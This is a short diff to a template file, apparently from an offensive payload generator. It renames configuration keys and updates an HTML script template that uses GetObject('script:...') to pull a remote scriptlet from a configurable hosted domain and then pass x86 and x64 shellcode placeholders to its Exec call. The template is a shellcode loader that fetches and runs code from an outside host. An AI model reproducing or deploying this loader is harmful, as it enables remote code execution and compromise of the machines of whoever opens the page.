@@ -4,17 +4,17 @@ value: notSet
 [ShellCodex86]
 value: notSet
 
-[Hosted Domain]
+[HostedDomain]
 value: notSet
 
-[Hosted Sct]
+[HostedSct]
 value: notSet
 
 [Template]
 data:
 	<html>
 		<script>
-			var a = GetObject('script:${Hosted Domain:value}/${Hosted Sct:value}');
+			var a = GetObject('script:${HostedDomain:value}/${HostedSct:value}');
 			var x64 = "${ShellCodex64:value}"
 			var x86 = "${ShellCodex86:value}"
 			a.Exec(x86, x64);
